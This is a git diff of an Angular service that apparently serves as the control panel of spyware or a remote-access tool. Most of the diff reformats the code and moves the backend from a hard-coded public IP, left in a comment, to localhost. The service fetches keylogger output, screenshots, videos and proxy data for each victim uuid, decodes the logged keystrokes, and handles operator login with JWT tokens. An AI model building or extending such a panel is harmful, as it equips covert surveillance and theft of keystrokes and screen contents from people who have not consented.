@@ -1,13 +1,12 @@
-import { Router } from '@angular/router';
+import { Router } from "@angular/router";
 import { HttpClient } from "@angular/common/http";
 import { Injectable, OnInit } from "@angular/core";
 import { BehaviorSubject, Observable, of } from "rxjs";
-import { HexBase64BinaryEncoding } from 'crypto';
-import { tap, mapTo, catchError } from 'rxjs/operators';
+import { HexBase64BinaryEncoding } from "crypto";
+import { tap, mapTo, catchError } from "rxjs/operators";
 
-export class Keylog
-{
-  out: string
+export class Keylog {
+  out: string;
 }
 export class Screenshot {
   link: string;
@@ -46,24 +45,20 @@ export class Tokens {
   providedIn: "root",
 })
 export class ServerService {
-  private msg = new BehaviorSubject<string>(
-"NoUser"
-  );
-  private curUser = new BehaviorSubject<User>(
-    null
-  );
+  private msg = new BehaviorSubject<string>("NoUser");
+  private curUser = new BehaviorSubject<User>(null);
   telecastUser = this.curUser.asObservable();
   telecast = this.msg.asObservable();
   allusers: User[];
-  public HOST = "http://77.37.136.144:8383/";
-  static HOST: string = "http://77.37.136.144:8383/";
-  constructor(private http: HttpClient,
-              private router: Router) {
+  // http://77.37.136.144:8383
+  public HOST = "http://localhost:4200/api/";
+  static HOST: string = "http://localhost:4200/api/";
+  constructor(private http: HttpClient) {
     this.IsAuthored = new BehaviorSubject<boolean>(false);
   }
 
   getAllUsers() {
-    const got = this.http.get("http://77.37.136.144:8383/api/users");
+    const got = this.http.get(this.HOST + "api/users");
     got.subscribe((response: User[]) => {
       this.allusers = response;
       this.curUser.next(response[0]);
@@ -80,66 +75,65 @@ export class ServerService {
 
   getScreenShotsForUser(uuid: string): Observable<Media> {
     // console.log(' this.HOST + "user/screenshots?uuid=" + uuid :>> ',  this.HOST + "user/screenshots?uuid=" + uuid);
-    return this.http.get<Media>(
-      this.HOST + "user/screenshots?uuid=" + uuid
-    );
+    return this.http.get<Media>(this.HOST + "api/user/" + uuid + "/screenshots");
   }
   getProxy(uuid: string): Observable<Keylog> {
     // console.log(' this.HOST + "user/screenshots?uuid=" + uuid :>> ',  this.HOST + "user/proxy?uuid=" + uuid);
-    return this.http.get<Keylog>(
-      this.HOST + "user/proxy?uuid=" + uuid
-    );
+    return this.http.get<Keylog>(this.HOST + "api/user/" + uuid + "/proxy")
   }
   getVideosForUser(uuid: string): Observable<Media> {
-    return this.http.get<Media>(this.HOST + "user/videos?uuid=" + uuid);
+    // return this.http.get<Media>(this.HOST + "user/videos?uuid=" + uuid);
+    return this.http.get<Media>(this.HOST + "api/user/" + uuid + "/videos")
   }
   getKeylogForUser(uuid: string): Observable<Keylog> {
-    return this.http.get<Keylog>(this.HOST + "user/keylog?uuid=" + uuid);
+    // return this.http.get<Keylog>(this.HOST + "user/keylog?uuid=" + uuid);
+    return this.http.get<Keylog>(this.HOST + "api/user/" + uuid + "/keylog")
   }
-  decodefrom64  = () => (source: Observable<Keylog>) =>
-  new Observable(observer => {
-    return source.subscribe({
-      next(x) {
-        observer.next(
-          atob(x.out)
-        );
-      },
-      error(err) { observer.error(err); },
-      complete() { observer.complete(); }
-    });
-  });
+  decodefrom64 = (resp) => console.log(atob(resp));
+  // (source: Observable<Keylog>) =>
+    // new Observable((observer) => {
+      // return resp.subscribe({
+      //   next(x) {
+      //     console.log('96 - x >> ', resp);
+      //     observer.next(atob(x.out));
+      //   },
+      //   error(err) {
+      //     observer.error(err);
+      //   },
+      //   complete() {
+      //     observer.complete();
+      //   },
+      // });
+    // });
 
-
-
-
-
-
-  /////////////
-  login(user:{username:string,password:string}):Observable<boolean>{
-    // "http://77.37.136.144:8383"
-    return this.http.post<any>(this.HOST+'api/user/login', JSON.stringify(user))
-    .pipe(
-      tap(tokens=>{
-        console.log(tokens);
-        this.doLoginUser(user.username,{jwt: tokens.access_token, refreshToken: tokens.refresh_token})
-      }),
-      mapTo(true),
-      catchError(error=>{
-        console.log(error);
-        return of(false);
-      })
-    )
+  login(user: { username: string; password: string }): Observable<boolean> {
+    return this.http
+      .post<any>(this.HOST + "api/user/login", JSON.stringify(user))
+      .pipe(
+        tap((tokens) => {
+          console.log(tokens);
+          this.doLoginUser(user.username, {
+            jwt: tokens.access_token,
+            refreshToken: tokens.refresh_token,
+          });
+        }),
+        mapTo(true),
+        catchError((error) => {
+          console.log(error);
+          return of(false);
+        })
+      );
   }
   private loggedUser: string;
-  public IsAuthored:BehaviorSubject<boolean>;
-  private readonly JWT_TOKEN = 'JWT_TOKEN';
-  private readonly REFRESH_TOKEN = 'REFRESH_TOKEN';
-  private readonly IS_AUTH = 'IS_AUTH';
+  public IsAuthored: BehaviorSubject<boolean>;
+  private readonly JWT_TOKEN = "JWT_TOKEN";
+  private readonly REFRESH_TOKEN = "REFRESH_TOKEN";
+  private readonly IS_AUTH = "IS_AUTH";
 
   private doLoginUser(username: string, tokens: Tokens) {
     this.loggedUser = username;
     this.storeTokens(tokens);
-    console.log("tokens: "+tokens+"user: "+username);
+    console.log("tokens: " + tokens + "user: " + username);
     this.IsAuthored.next(true);
   }
 
@@ -151,12 +145,15 @@ export class ServerService {
   }
 
   refreshToken() {
-    return this.http.post<any>(ServerService.HOST+'api/tokens/update', {
-      'refreshToken': this.getRefreshToken()
-    }).pipe(tap((tokens: Tokens) => {
-      this.storeJwtToken(tokens.jwt);
-
-    }));
+    return this.http
+      .post<any>(ServerService.HOST + "api/tokens/update", {
+        refreshToken: this.getRefreshToken(),
+      })
+      .pipe(
+        tap((tokens: Tokens) => {
+          this.storeJwtToken(tokens.jwt);
+        })
+      );
   }
 
   private getRefreshToken() {
@@ -174,5 +171,4 @@ export class ServerService {
   getUserStatus(): boolean {
     return !!localStorage.getItem(this.IS_AUTH);
   }
-/////////////
 }
